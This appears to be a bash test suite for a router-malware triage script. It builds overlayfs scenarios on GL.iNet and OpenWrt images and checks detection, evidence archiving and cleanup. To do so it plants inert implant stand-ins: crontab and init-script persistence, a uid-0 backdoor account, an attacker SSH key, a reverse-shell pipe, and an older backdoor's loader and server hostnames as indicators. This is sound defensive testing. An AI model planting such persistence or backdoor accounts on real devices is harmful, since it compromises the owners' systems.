#!/bin/bash
# Tests for gl-helper-triage.sh on real overlayfs mounts inside an unprivileged user
# namespace (no root needed, Linux >= 5.11):
#
#   unshare -rm bash tests/run-tests.sh
#   KVM_LOWER=/path/to/extracted/rm1pe-1.10.2/rootfs unshare -rm bash tests/run-tests.sh
#
# The OpenWrt scenarios use a small synthetic base image. The KVM scenarios need the
# extracted rootfs of a GL.iNet KVM firmware (e.g. RM1PE 1.10.2) in KVM_LOWER.
set -u
T=$(cd "$(dirname "$0")/.." && pwd)/gl-helper-triage.sh
KVM_LOWER=${KVM_LOWER:-}
BASE=$(mktemp -d)
trap 'umount "$BASE"/*/m 2>/dev/null; rm -rf "$BASE"' EXIT
pass=0 fail=0
ok()  { echo "  PASS: $*"; pass=$((pass+1)); }
bad() { echo "  FAIL: $*"; fail=$((fail+1)); }
expect() { if eval "$2"; then ok "$1"; else bad "$1"; fi; }

# The script under test can be given its own shell and its own tools, so that it runs as
# it does on a device while this file keeps the tools of the machine:
#   TRIAGE_SH="busybox sh" TRIAGE_PATH=/path/to/busybox-applets unshare -rm bash tests/run-tests.sh
TRIAGE_SH=${TRIAGE_SH:-sh}
TRIAGE_PATH=${TRIAGE_PATH:-$PATH}
# A netstat link counts as the installer's only when it was made while the attack ran
# (issue 25). The links the tests make carry today's time, so the window ends later here;
# the test of the window itself unsets this.
export GL_TRIAGE_ATTACK_UNTIL='2100-01-01 00:00:00 UTC'
# shellcheck disable=SC2086 # TRIAGE_SH may be two words ("busybox sh")
triage() { env PATH="$TRIAGE_PATH" $TRIAGE_SH "$T" "$@"; }
if [ "$TRIAGE_PATH" = "$PATH" ]; then echo "script runs with: $TRIAGE_SH, the tools of this machine"; else echo "script runs with: $TRIAGE_SH, tools only from $TRIAGE_PATH"; fi

mkscen() { # name lower
	local d=$BASE/$1
	mkdir -p "$d/u" "$d/w" "$d/m" "$d/out"
	mount -t overlay overlay -o "lowerdir=$2,upperdir=$d/u,workdir=$d/w" "$d/m"
	umount "$d/m"
	echo "$d"
}
mnt() { mount -t overlay overlay -o "lowerdir=$2,upperdir=$1/u,workdir=$1/w" "$1/m"; }
run() { # dir lower mode...
	local d=$1 lo=$2; shift 2
	triage --root "$d/m" --upper "$d/u" --lower "$lo" -o "$d/out" "$@"
}

echo "=== 0. The version and its release time are where the website's guide reads them"
expect "VERSION and RELEASED lines have the form the guide expects" 'grep -qE "^VERSION=[0-9]+\.[0-9]+\$" "$T" && grep -qE "^RELEASED=.20[0-9]{2}-[01][0-9]-[0-3][0-9] [0-2][0-9]:[0-5][0-9] UTC.\$" "$T"'

# ------------------------------------------------------------ OpenWrt base image
OWL=$BASE/openwrt-rom
mkdir -p "$OWL"/{etc/init.d,etc/rc.d,bin,usr/bin,lib/apk/db,etc/crontabs}
echo "DISTRIB_ID='OpenWrt'" >"$OWL/etc/openwrt_release"
printf '# Put your custom commands here\nexit 0\n' >"$OWL/etc/rc.local"
printf '#!/bin/sh\n' >"$OWL/etc/init.d/cron"; printf '#!/bin/sh\n' >"$OWL/etc/init.d/dnsmasq"
printf 'root:x:0:0:root:/root:/bin/ash\ndaemon:*:1:1:daemon:/var:/bin/false\n' >"$OWL/etc/passwd"
echo dummy >"$OWL/bin/busybox"; ln -s busybox "$OWL/bin/netstat"; ln -s busybox "$OWL/bin/login"
mkdir -p "$OWL/etc/uci-defaults"; echo 'uci commit' >"$OWL/etc/uci-defaults/10_firstboot"
printf 'P:busybox\nF:bin\nR:busybox\n\n' >"$OWL/lib/apk/db/installed"
echo openwrt >"$OWL/etc/hostname"
printf '#!/bin/sh /etc/rc.common\nSTART=99\n' >"$OWL/etc/init.d/urandom_seed"
echo lua-interpreter >"$OWL/usr/bin/lua"
mkdir -p "$OWL/lib/upgrade/keep.d"; echo /etc/config/network >"$OWL/lib/upgrade/keep.d/netifd"

if [ -n "$KVM_LOWER" ]; then
echo "=== 1. KVM (RM1PE 1.10.2 base), infected"
D=$(mkscen kvm "$KVM_LOWER"); U=$D/u
mkdir -p "$U"/etc/glinet/.cache "$U"/etc/config/.gl "$U"/etc/crontabs "$U"/usr/bin "$U"/bin "$U"/root/.ssh "$U"/etc/init.d
printf '#!/bin/sh\nwhile :; do sleep 60; done\n' >"$U/etc/glinet/.cache/gl-helper"; chmod 755 "$U/etc/glinet/.cache/gl-helper"
echo payload >"$U/etc/glinet/.cache/gb"; echo payload >"$U/etc/config/.gl/gb"
echo '/etc/glinet/.cache/gl-helper &' >"$U/etc/rc.local"
echo '*/5 * * * * /etc/config/.gl/gb >/dev/null 2>&1' >"$U/etc/crontabs/root"
printf '#!/bin/sh\n# trojan netstat\n' >"$U/usr/bin/netstat"; chmod 755 "$U/usr/bin/netstat"
printf 'fake ls\n' >"$U/bin/ls"; chmod 755 "$U/bin/ls"
cp "$KVM_LOWER/usr/bin/wget" "$U/usr/bin/wget"; echo x >>"$U/usr/bin/wget"
echo 'ssh-ed25519 AAAA attacker' >"$U/root/.ssh/authorized_keys"
printf '#!/bin/sh\n/etc/glinet/.cache/gl-helper\n' >"$U/etc/init.d/S99update-helper"
{ cat "$KVM_LOWER/etc/passwd"; echo 'backdoor:x:0:0::/root:/bin/sh'; } >"$U/etc/passwd"
echo note >"$U/etc/.hidden-note"
cp -a "$KVM_LOWER/etc/hostname" "$U/etc/hostname" 2>/dev/null
mnt "$D" "$KVM_LOWER"
run "$D" "$KVM_LOWER" --check >"$D/check.txt"; rc=$?
cat "$D/check.txt"
expect "check exit 1 (infected)" '[ $rc = 1 ]'
expect "3 markers" '[ $(grep -c "^ *IOC  *marker" "$D/check.txt") = 3 ]'
expect "netstat + ls hijack" 'grep -q "applet-hijack *\/usr\/bin\/netstat" "$D/check.txt" && grep -q "applet-hijack *\/bin\/ls" "$D/check.txt"'
expect "rc.local + crontab + init script reference IOC" '[ $(grep -c "persist-ref" "$D/check.txt") = 3 ] && grep -q "persist-ref *\/etc\/init.d\/S99update-helper" "$D/check.txt"'
expect "wget = REVIEW modified-binary" 'grep -q "REVIEW  *modified-binary *\/usr\/bin\/wget" "$D/check.txt"'
expect "authorized_keys + hidden = REVIEW" 'grep -q "REVIEW  *new *\/root\/.ssh\/authorized_keys" "$D/check.txt" && grep -q "hidden-note" "$D/check.txt"'
expect "uid0 backdoor account" 'grep -A1 "uid0-account" "$D/check.txt" | grep -q backdoor'
expect "identical copy-up (hostname) ignored" '! grep -q "/etc/hostname" "$D/check.txt"'
run "$D" "$KVM_LOWER" --fix >"$D/fix.txt"; rc=$?
sed -n '/== Remediation/,$p' "$D/fix.txt"
expect "fix exit 2 (clean afterwards)" '[ $rc = 2 ]'
A=$(ls "$D"/out/gl-triage-*.tar.gz 2>/dev/null | head -1)
expect "archive exists + sha256 ok" '[ -n "$A" ] && (cd "$D/out" && sha256sum -c "${A##*/}.sha256" >/dev/null)'
expect "archive has implant + trojan netstat + crontab" 'tar -tzf "$A" | grep -q "files/upper/etc/glinet/.cache/gl-helper" && tar -tzf "$A" | grep -q "files/upper/usr/bin/netstat" && tar -tzf "$A" | grep -q "files/merged/etc/crontabs/root"'
expect "archive MANIFEST verifies" 'mkdir -p "$D/x" && tar -C "$D/x" -xzf "$A" && (cd "$D/x/evidence" && sha256sum -c MANIFEST.sha256 >/dev/null)'
expect "markers gone" '[ ! -e "$D/m/etc/glinet/.cache" ] && [ ! -e "$D/m/etc/config/.gl" ]'
expect "rc.local + crontab gone (not in base)" '[ ! -e "$D/m/etc/rc.local" ] && [ ! -e "$D/m/etc/crontabs/root" ]'
expect "netstat restored as busybox symlink" '[ -L "$D/m/usr/bin/netstat" ] && [ "$(readlink "$D/m/usr/bin/netstat")" = "$(readlink "$KVM_LOWER/usr/bin/netstat")" ]'
expect "ls restored as coreutils symlink" '[ -L "$D/m/bin/ls" ] && [ "$(readlink "$D/m/bin/ls")" = coreutils ]'
expect "implant init script removed" '[ ! -e "$D/m/etc/init.d/S99update-helper" ]'
expect "REVIEW items untouched (wget, keys)" '[ -f "$D/m/root/.ssh/authorized_keys" ] && ! cmp -s "$D/m/usr/bin/wget" "$KVM_LOWER/usr/bin/wget"'
run "$D" "$KVM_LOWER" --check >/dev/null; rc=$?
expect "re-check after fix: exit 0" '[ $rc = 0 ]'
umount "$D/m"
else
	echo "=== 1. KVM: skipped (set KVM_LOWER)"
fi

echo; echo "=== 2. OpenWrt router, infected"
D=$(mkscen owrt "$OWL"); U=$D/u
mkdir -p "$U"/etc/config/.gl "$U"/etc/crontabs "$U"/usr/bin "$U"/etc/rc.d "$U"/etc/init.d "$U"/etc/dropbear
echo x >"$U/etc/config/.gl/gl-helper"; echo x >"$U/etc/config/.gl/gb"
echo '0 3 * * * /etc/config/.gl/gl-helper' >"$U/etc/crontabs/root"
printf '/usr/bin/my-led-script\nexit 0\n' >"$U/etc/rc.local"
printf 'trojan\n' >"$U/usr/bin/netstat"; chmod 755 "$U/usr/bin/netstat"
ln -s ../init.d/dnsmasq "$U/etc/rc.d/S19dnsmasq"
printf '#!/bin/sh\n' >"$U/etc/init.d/gl-update"; ln -s ../init.d/gl-update "$U/etc/rc.d/S99gl-update"
echo key >"$U/etc/dropbear/dropbear_ed25519_host_key"
printf '/etc/my-own-file\n/etc/config/.gl/\n' >"$U/etc/sysupgrade.conf"
printf '#!/bin/sh /etc/rc.common\nstart() { /etc/config/.gl/gl-helper & }\n' >"$U/etc/init.d/glhelper"; ln -s ../init.d/glhelper "$U/etc/rc.d/S95glhelper"
mkdir -p "$U/bin"; ln -s /bin/busybox "$U/bin/login"
mnt "$D" "$OWL"
rm "$D/m/etc/uci-defaults/10_firstboot"   # overlay creates a whiteout, like OpenWrt after first boot
run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
cat "$D/check.txt"
expect "whiteout really created" '[ -c "$U/etc/uci-defaults/10_firstboot" ]'
expect "whiteout (deleted uci-defaults) not reported" '! grep -q "10_firstboot" "$D/check.txt"'
expect "absolute vs relative symlink to busybox not reported" '! grep -q "/bin/login" "$D/check.txt"'
expect "check exit 1" '[ $rc = 1 ]'
expect "platform openwrt" 'grep -q "Platform  *openwrt" "$D/check.txt"'
expect "markers 2 + crontab + netstat + init script + keep list = 6 IOC" 'grep -q "Summary: IOC=6 " "$D/check.txt" && grep -q "keep-ref *\/etc\/sysupgrade.conf" "$D/check.txt"'
expect "custom rc.local = PERSIST (not IOC)" 'grep -q "PERSIST  *persistence *\/etc\/rc.local" "$D/check.txt"'
expect "known service link S19dnsmasq ignored" '! grep -q "S19dnsmasq" "$D/check.txt"'
expect "benign new service + rc.d link = REVIEW" 'grep -q "REVIEW  *new *\/etc\/rc.d\/S99gl-update" "$D/check.txt" && grep -q "REVIEW  *new *\/etc\/init.d\/gl-update" "$D/check.txt"'
expect "dropbear host key ignored" '! grep -q "host_key" "$D/check.txt"'
expect "recommendation warns about keep-settings" 'grep -q "WITHOUT keeping settings" "$D/check.txt"'
run "$D" "$OWL" --fix >"$D/fix.txt"; rc=$?
sed -n '/== Remediation/,$p' "$D/fix.txt"
expect "fix exit 2" '[ $rc = 2 ]'
expect "rc.local restored to base content" 'cmp -s "$D/m/etc/rc.local" "$OWL/etc/rc.local"'
expect "netstat removed (not in base), /bin/netstat intact" '[ ! -e "$D/m/usr/bin/netstat" ] && [ -L "$D/m/bin/netstat" ]'
expect "crontab + .gl gone" '[ ! -e "$D/m/etc/crontabs/root" ] && [ ! -e "$D/m/etc/config/.gl" ]'
expect "implant service + its rc.d link removed, benign service kept" '[ ! -e "$D/m/etc/init.d/glhelper" ] && [ ! -L "$D/m/etc/rc.d/S95glhelper" ] && [ -f "$D/m/etc/init.d/gl-update" ] && [ -L "$D/m/etc/rc.d/S99gl-update" ] && [ -L "$D/m/etc/rc.d/S19dnsmasq" ]'
expect "sysupgrade.conf: only implant line removed" 'grep -qx "/etc/my-own-file" "$D/m/etc/sysupgrade.conf" && ! grep -q "\.gl" "$D/m/etc/sysupgrade.conf"'
expect "custom rc.local kept in archive" 'tar -xzOf "$(ls "$D"/out/*.tar.gz)" evidence/files/merged/etc/rc.local | grep -q my-led-script'
umount "$D/m"

if [ -n "$KVM_LOWER" ]; then
echo; echo "=== 3. Variant without markers (vendor cleanup would miss it)"
D=$(mkscen nomark "$KVM_LOWER"); U=$D/u
mkdir -p "$U"/etc/crontabs "$U"/usr/bin
echo '*/5 * * * * /etc/config/.gl/gb' >"$U/etc/crontabs/root"
printf 'trojan\n' >"$U/usr/bin/netstat"
mnt "$D" "$KVM_LOWER"
run "$D" "$KVM_LOWER" --check >"$D/check.txt"; rc=$?
grep -E '^ +(IOC|PERSIST|REVIEW|INFO) |Summary|Verdict' "$D/check.txt"
expect "detected without markers (exit 1, IOC=2)" '[ $rc = 1 ] && grep -q "Summary: IOC=2 " "$D/check.txt"'
run "$D" "$KVM_LOWER" --fix >/dev/null; rc=$?
expect "fixed (exit 2)" '[ $rc = 2 ] && [ ! -e "$D/m/etc/crontabs/root" ] && [ -L "$D/m/usr/bin/netstat" ]'
umount "$D/m"

echo; echo "=== 4. Clean KVM"
D=$(mkscen clean "$KVM_LOWER"); mnt "$D" "$KVM_LOWER"
run "$D" "$KVM_LOWER" --check >"$D/check.txt"; rc=$?
grep -E 'Summary|Verdict' "$D/check.txt"
expect "clean: exit 0, IOC=0" '[ $rc = 0 ] && grep -q "Summary: IOC=0 " "$D/check.txt"'
run "$D" "$KVM_LOWER" --fix >"$D/fix.txt"; rc=$?
expect "fix on clean device changes nothing, exit 0" '[ $rc = 0 ] && grep -q "nothing to remediate" "$D/fix.txt" && [ -z "$(ls -A "$D/u")" ]'
run "$D" "$KVM_LOWER" --archive --stdout >"$D/stdout.tar.gz" 2>"$D/stdout.log"; rc=$?
expect "--archive --stdout gives valid tar.gz, log on stderr" '[ $rc = 0 ] && tar -tzf "$D/stdout.tar.gz" | grep -q evidence/report.txt && grep -q "Verdict" "$D/stdout.log"'
expect "the archive's progress is shown, on stderr and not in the archive stream" 'grep -q "archive: fingerprints of every changed file" "$D/stdout.log" && grep -q "archive: packing" "$D/stdout.log"'
umount "$D/m"
else
	echo "=== 3./4. KVM: skipped (set KVM_LOWER)"
fi

echo; echo "=== 5. OpenWrt, netstat installed by a package (apk) -> INFO only"
D=$(mkscen pkg "$OWL"); U=$D/u
mkdir -p "$U/usr/bin" "$U/lib/apk/db"
printf '\177ELF real netstat\n' >"$U/usr/bin/netstat"
{ cat "$OWL/lib/apk/db/installed"; printf 'P:net-tools-netstat\nF:usr/bin\nR:netstat\n\n'; } >"$U/lib/apk/db/installed"
mnt "$D" "$OWL"
run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
grep -E '^ +(IOC|PERSIST|REVIEW|INFO) |Summary' "$D/check.txt"
expect "package netstat is INFO, exit 0" '[ $rc = 0 ] && grep -q "installed by package net-tools-netstat" "$D/check.txt"'
# the list of packages lies in the overlay too: a text file that it names is not believed
# to be the package's program (review of 2.55)
printf 'trojan\n' >"$D/m/usr/bin/netstat"
run "$D" "$OWL" --check >"$D/check2.txt"; rc=$?
expect "a text file the list of packages names is REVIEW applet-replaced, not INFO" '[ $rc = 0 ] && grep -q "REVIEW  *applet-replaced  */usr/bin/netstat" "$D/check2.txt" && ! grep -q "installed by package net-tools-netstat" "$D/check2.txt"'
umount "$D/m"

echo; echo "=== 6. OpenWrt with opkg (firmware 4.x), netstat installed by a package -> INFO only"
OWO=$BASE/openwrt-rom-opkg
cp -a "$OWL" "$OWO"; rm -rf "$OWO/lib/apk"; mkdir -p "$OWO/usr/lib/opkg/info"
D=$(mkscen opkg "$OWO"); U=$D/u
mkdir -p "$U/usr/bin" "$U/usr/lib/opkg/info"
printf '\177ELF real netstat\n' >"$U/usr/bin/netstat"
printf '/usr/bin/netstat\n' >"$U/usr/lib/opkg/info/net-tools-netstat.list"
mnt "$D" "$OWO"
run "$D" "$OWO" --check >"$D/check.txt"; rc=$?
grep -E '^ +(IOC|PERSIST|REVIEW|INFO) |Summary' "$D/check.txt"
expect "opkg package netstat is INFO, exit 0" '[ $rc = 0 ] && grep -q "installed by package net-tools-netstat" "$D/check.txt"'
expect "no stray heading in the report" '! grep -q -- "== -n" "$D/check.txt"'
umount "$D/m"

echo; echo "=== 7. OpenWrt, firewall config changed and a new nftables include"
mkdir -p "$OWL/etc/config"
printf "config defaults\n\toption input 'REJECT'\n" >"$OWL/etc/config/firewall"
D=$(mkscen fw "$OWL"); U=$D/u
mkdir -p "$U/etc/config" "$U/etc/nftables.d"
printf "config defaults\n\toption input 'REJECT'\n\nconfig redirect\n\toption name 'evil'\n\toption dest_ip '10.9.9.9'\n" >"$U/etc/config/firewall"
printf '# comment\nchain x { tcp dport 22 accept }\n' >"$U/etc/nftables.d/10-x.nft"
printf 'aa:bb:cc:dd:ee:ff 10.0.0.2 192.168.8.2\n' >"$U/etc/mp_ip_mapping_info"
mnt "$D" "$OWL"
run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
sed -n '/== Firewall/,/== Result/p' "$D/check.txt"
expect "changed firewall config = REVIEW with 3 new lines, exit 0" '[ $rc = 0 ] && grep -q "REVIEW  *fw-config  *\/etc\/config\/firewall" "$D/check.txt" && grep -q "3 lines that are not in it" "$D/check.txt"'
expect "new lines are listed, unchanged ones are not" 'grep -q "option dest_ip .10.9.9.9." "$D/check.txt" && ! grep -q "option input" "$D/check.txt"'
expect "new nftables include = REVIEW, comment not listed" 'grep -q "REVIEW  *fw-config  *\/etc\/nftables.d\/10-x.nft" "$D/check.txt" && grep -q "tcp dport 22 accept" "$D/check.txt" && ! grep -q "# comment" "$D/check.txt"'
expect "state file with entries = REVIEW with its time" 'grep -A1 "REVIEW  *state-file  *\/etc\/mp_ip_mapping_info" "$D/check.txt" | grep -q "written 20.* UTC, 39 bytes, AstroWarp off"'
run "$D" "$OWL" --archive >/dev/null
expect "firewall config is in the archive" 'tar -tzf "$(ls "$D"/out/*.tar.gz)" | grep -q "files/merged/etc/config/firewall"'
umount "$D/m"

echo; echo "=== 8. Pipe of the reported remote shell left in /tmp"
D=$(mkscen pipe "$OWL")
mnt "$D" "$OWL"
mkdir -p "$D/m/tmp"; mkfifo "$D/m/tmp/f"
run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
grep -E -A1 '^ +IOC ' "$D/check.txt"
expect "pipe /tmp/f = IOC, exit 1" '[ $rc = 1 ] && grep -q "IOC  *pipe  *\/tmp\/f" "$D/check.txt" && grep -q "last data 20.* UTC" "$D/check.txt"'
run "$D" "$OWL" --fix >"$D/fix.txt"; rc=$?
expect "fix removes the pipe, exit 2" '[ $rc = 2 ] && [ ! -e "$D/m/tmp/f" ] && grep -q "removed the pipe" "$D/fix.txt"'
umount "$D/m"

echo; echo "=== 8a. Only the shell's pipe: the owner's rc.local and crontab stay (issue 5)"
D=$(mkscen pipeown "$OWL")
mnt "$D" "$OWL"
mkdir -p "$D/m/tmp" "$D/m/etc/crontabs"; mkfifo "$D/m/tmp/f"
printf '/usr/bin/my-own-thing &\nexit 0\n' >"$D/m/etc/rc.local"
echo '0 3 * * * /usr/bin/my-backup' >"$D/m/etc/crontabs/root"
run "$D" "$OWL" --fix >"$D/fix.txt"; rc=$?
grep -E 'left /|removed|restored' "$D/fix.txt"
expect "fix removes the pipe and leaves rc.local and the crontab, exit 2" '[ $rc = 2 ] && [ ! -e "$D/m/tmp/f" ] && grep -q my-own-thing "$D/m/etc/rc.local" && grep -q my-backup "$D/m/etc/crontabs/root" && grep -q "left /etc/rc.local as it is" "$D/fix.txt"'
umount "$D/m"

echo; echo "=== 8b. Blocking the older backdoor's servers is not the backdoor (issue 5)"
D=$(mkscen bdblock "$OWL")
mnt "$D" "$OWL"
mkdir -p "$D/m/etc/config" "$D/m/etc/dnsmasq.d"
printf '127.0.0.1 localhost\n0.0.0.0 cdn.adguardns.com\n::\tup.adguardns.org\n' >"$D/m/etc/hosts"
printf 'address=/adxinsight.com/\naddress=/lede-openproject.org/0.0.0.0\nserver=/openwrt-project.org/\n' >"$D/m/etc/dnsmasq.d/block.conf"
printf "config dnsmasq\n\tlist address '/adguardns.com/0.0.0.0'\n\tlist server '/adguardns.org/'\n" >"$D/m/etc/config/dhcp"
run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
grep -E -A1 'backdoor-' "$D/check.txt"
expect "block entries are INFO, exit 0, clean verdict" '[ $rc = 0 ] && grep -q "INFO  *backdoor-block  */etc/hosts" "$D/check.txt" && grep -q "INFO  *backdoor-block  */etc/dnsmasq.d/block.conf" "$D/check.txt" && grep -q "INFO  *backdoor-block  */etc/config/dhcp" "$D/check.txt" && ! grep -q "IOC  *backdoor-host" "$D/check.txt"'
echo '203.0.113.7 cdn.adxinsight.com' >>"$D/m/etc/hosts"
echo 'server=/adguardns.com/203.0.113.7' >>"$D/m/etc/dnsmasq.d/block.conf"
run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
expect "a name with a real address is still IOC, shown in full" '[ $rc = 1 ] && grep -q "IOC  *backdoor-host  */etc/hosts" "$D/check.txt" && grep -q "IOC  *backdoor-host  */etc/dnsmasq.d/block.conf" "$D/check.txt" && grep -q "cdn.adxinsight.com" "$D/check.txt"'
umount "$D/m"

echo; echo "=== 9. Stored SSH client keys and VPN credentials are listed, without their content"
C() { sed -n '/== Credentials/,/== Result/p' "$D/check.txt"; }   # the credentials section only
OWC=$BASE/openwrt-rom-creds
cp -a "$OWL" "$OWC"
# what the firmware ships without any secret: an empty ZeroTier secret, VPN configuration
# without keys, an empty ZeroTier directory (KVM)
mkdir -p "$OWC/etc/config" "$OWC/etc/kvmd/user/zerotier"
printf "config zerotier 'sample_config'\n\toption enabled '0'\n\toption secret ''\n" >"$OWC/etc/config/zerotier"
printf "config providers 'FromApp'\n\toption auth_type '1'\n" >"$OWC/etc/config/wireguard"
printf "config servers 'main_server'\n\toption port '51820'\n" >"$OWC/etc/config/wireguard_server"
printf '#!/bin/sh\necho "Public key portion is:"\necho "ssh-ed25519 AAAATESTPUB root@test"\necho "Fingerprint: SHA256:TESTFINGERPRINT"\n' >"$OWC/usr/bin/dropbearkey"; chmod 755 "$OWC/usr/bin/dropbearkey"
D=$(mkscen nocreds "$OWC")
mnt "$D" "$OWC"
run "$D" "$OWC" --check >"$D/check.txt"; rc=$?
expect "firmware defaults without secrets: no credentials section, exit 0" '[ $rc = 0 ] && ! grep -q "Credentials on this device" "$D/check.txt"'
umount "$D/m"

D=$(mkscen creds "$OWC"); U=$D/u
mkdir -p "$U/root/.ssh" "$U/etc/config" "$U/etc/openvpn/profiles/office/auth" "$U/etc/tailscale" "$U/etc/kvmd/user/zerotier" "$U/var/lib"
echo SECRETKEYDATA >"$U/root/.ssh/id_dropbear"; echo SECRETKEYDATA >"$U/root/.ssh/id_ed25519"
echo 'ssh-ed25519 AAAA root@test' >"$U/root/.ssh/id_ed25519.pub"
echo SECRETKEYDATA >"$U/root/.ssh/id_$(printf 'odd\tname')"
printf "config groups 'group_1'\n\toption private_key 'SECRETWGKEY1'\n\nconfig peers 'peer_2'\n\toption private_key 'SECRETWGKEY2'\n\nconfig peers 'peer_3'\n\toption group_id '1'\n" >"$U/etc/config/wireguard"
printf "config servers 'main_server'\n\toption private_key 'SECRETWGKEY3'\n" >"$U/etc/config/wireguard_server"
echo SECRETOVPN >"$U/etc/openvpn/profiles/office/a.ovpn"; echo SECRETOVPN >"$U/etc/openvpn/profiles/office/b.ovpn"
echo SECRETLOGIN >"$U/etc/openvpn/profiles/office/auth/username_password.txt"
printf "config zerotier 'gl'\n\toption enabled '1'\n\toption secret 'SECRETZTID'\n" >"$U/etc/config/zerotier"
echo SECRETZTID >"$U/etc/kvmd/user/zerotier/identity.secret"; ln -s ../../etc/kvmd/user/zerotier "$U/var/lib/zerotier-one"
echo SECRETSTATE >"$U/etc/tailscale/tailscaled.state"
mnt "$D" "$OWC"
run "$D" "$OWC" --check >"$D/check.txt"; rc=$?
C
expect "credentials alone are no indicator: exit 0, IOC=0 PERSIST=0" '[ $rc = 0 ] && grep -q "Summary: IOC=0 PERSIST=0 " "$D/check.txt"'
expect "three SSH client keys with fingerprint, .pub not listed" '[ $(C | grep -c "SSH client key") = 3 ] && C | grep -q "/root/.ssh/id_dropbear" && [ $(C | grep -c "SHA256:TESTFINGERPRINT") = 3 ] && ! C | grep -q "id_ed25519.pub"'
expect "a key name with a tab in it is printed with plain characters only" 'C | grep -q "/root/.ssh/id_odd?name$" && ! C | grep -q "$(printf "\\t")"'
expect "WireGuard: 2 client keys, 1 server key" 'C | grep -A1 "WireGuard client  */etc/config/wireguard$" | grep -q "2 private key" && C | grep -A1 "WireGuard server" | grep -q "1 private key"'
expect "OpenVPN: 2 client profiles" 'C | grep -A1 "OpenVPN client" | grep -q "2 profile"'
expect "ZeroTier identity listed once, from the configuration" '[ $(C | grep -c "^ *ZeroTier") = 1 ] && C | grep -q "ZeroTier  */etc/config/zerotier"'
expect "Tailscale state of the router" 'C | grep -q "Tailscale  */etc/tailscale/tailscaled.state"'
expect "no key content or public key anywhere in the output" '! grep -q "SECRET\|AAAATESTPUB" "$D/check.txt"'
expect "no advice to revoke without indicators" '! grep -q "listed above under" "$D/check.txt" && ! grep -q "treat all of these as copied" "$D/check.txt"'
mkdir -p "$D/m/tmp"; mkfifo "$D/m/tmp/f"
run "$D" "$OWC" --check >"$D/check2.txt"; rc=$?
expect "with an indicator: exit 1, the advice to revoke and a pointer to the list" '[ $rc = 1 ] && grep -q "treat all of these as copied" "$D/check2.txt" && grep -q "listed above under" "$D/check2.txt"'
umount "$D/m"

D=$(mkscen kvmcreds "$OWL"); U=$D/u
mkdir -p "$U/root/.ssh" "$U/etc/kvmd/user/zerotier" "$U/var/lib"
echo SECRETKEYDATA >"$U/root/.ssh/id_rsa"
echo SECRETZTID >"$U/etc/kvmd/user/zerotier/identity.secret"; ln -s ../../etc/kvmd/user/zerotier "$U/var/lib/zerotier-one"
mnt "$D" "$OWL"
run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
C
expect "KVM layout: identity file listed once" '[ $(C | grep -c "^ *ZeroTier") = 1 ] && C | grep -q "ZeroTier  */etc/kvmd/user/zerotier/identity.secret"'
expect "no dropbearkey in the base image: key listed without fingerprint" 'C | grep -A1 "SSH client key  */root/.ssh/id_rsa" | grep -q "fingerprint not available"'
umount "$D/m"

echo "=== older backdoor (urandom_seed / ulogd / monitord)"
backdoor() { # upper dir
	mkdir -p "$1/etc/init.d" "$1/bin" "$1/usr/bin" "$1/lib/upgrade/keep.d"
	printf '#!/bin/sh /etc/rc.common\ncp /usr/bin/lua /usr/bin/monitord\ncp /bin/ulogd /var/run/monitord.pid\n/usr/bin/monitord /var/run/monitord.pid &\nSTART=99\n' >"$1/etc/init.d/urandom_seed"
	echo bytecode >"$1/bin/ulogd"; echo lua-interpreter >"$1/usr/bin/monitord"
	printf '/etc/config/network\n/bin/ulogd\n/etc/init.d/urandom_seed\n' >"$1/lib/upgrade/keep.d/netifd"
}
D=$(mkscen bd "$OWL"); U=$D/u
backdoor "$U"
mkdir -p "$U/etc/AdGuardHome/data"; echo '{"QH":"up.adguardns.org"}' >"$U/etc/AdGuardHome/data/querylog.json"
echo '1.2.3.4 cdn.lede-openproject.org' >"$U/etc/hosts"
mkdir -p "$U/etc/config"; printf 'x http://up.adsanalypro.com/\n' >"$U/etc/config/other"
mnt "$D" "$OWL"
run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
expect "the server name of the second build (RemoteToHome) is IOC too" 'grep -A1 "IOC  *backdoor-host  */etc/config/other" "$D/check.txt" | grep -q "up.adsanalypro.com"'
expect "the advice names it among the servers to block, and a reinstall from an own file" 'grep -q "adsanalypro.com" "$D/check.txt" && grep -q "downloaded yourself" "$D/check.txt"'
expect "with its start script in place the loader is not called a remnant" '! grep -q "no longer started at boot" "$D/check.txt"'
expect "backdoor only: exit 1 and its own verdict" '[ $rc = 1 ] && grep -q "Verdict: INFECTED - older backdoor" "$D/check.txt" && grep -q "no gl-helper indicators found" "$D/check.txt"'
expect "init script, loader, renamed Lua and keep list are IOC" 'grep -q "IOC  *backdoor-init  */etc/init.d/urandom_seed" "$D/check.txt" && grep -q "IOC  *backdoor-file  */bin/ulogd" "$D/check.txt" && grep -q "IOC  *backdoor-file  */usr/bin/monitord" "$D/check.txt" && grep -q "IOC  *backdoor-keep  */lib/upgrade/keep.d/netifd" "$D/check.txt"'
expect "server name in the configuration is IOC, in the query log REVIEW" 'grep -q "IOC  *backdoor-host  */etc/hosts" "$D/check.txt" && grep -q "REVIEW  *backdoor-dns" "$D/check.txt"'
expect "no second finding for the same path" '[ $(grep -c " /bin/ulogd$" "$D/check.txt") = 1 ] && [ $(grep -c " /etc/init.d/urandom_seed$" "$D/check.txt") = 1 ]'
expect "advice is a reflash without keeping settings" 'grep -q "keep settings.* OFF" "$D/check.txt"'
run "$D" "$OWL" --fix >"$D/fix.txt"; rc=$?
expect "--fix changes nothing and says so: exit 1, files still there" '[ $rc = 1 ] && grep -q "does not remove the older backdoor" "$D/fix.txt" && [ -f "$D/m/bin/ulogd" ] && grep -q monitord "$D/m/etc/init.d/urandom_seed"'
expect "the loader is in the archive" 'tar -tzf "$(ls "$D"/out/*.tar.gz | head -n 1)" | grep -q "bin/ulogd"'
umount "$D/m"

D=$(mkscen bdboth "$OWL"); U=$D/u
backdoor "$U"
mkdir -p "$U/etc/config/.gl"; echo payload >"$U/etc/config/.gl/gl-helper"
mnt "$D" "$OWL"
run "$D" "$OWL" --check >"$D/check.txt"
expect "both: one verdict that names both" 'grep -q "Verdict: INFECTED - gl-helper indicators and the older backdoor" "$D/check.txt"'
run "$D" "$OWL" --fix >"$D/fix.txt"; rc=$?
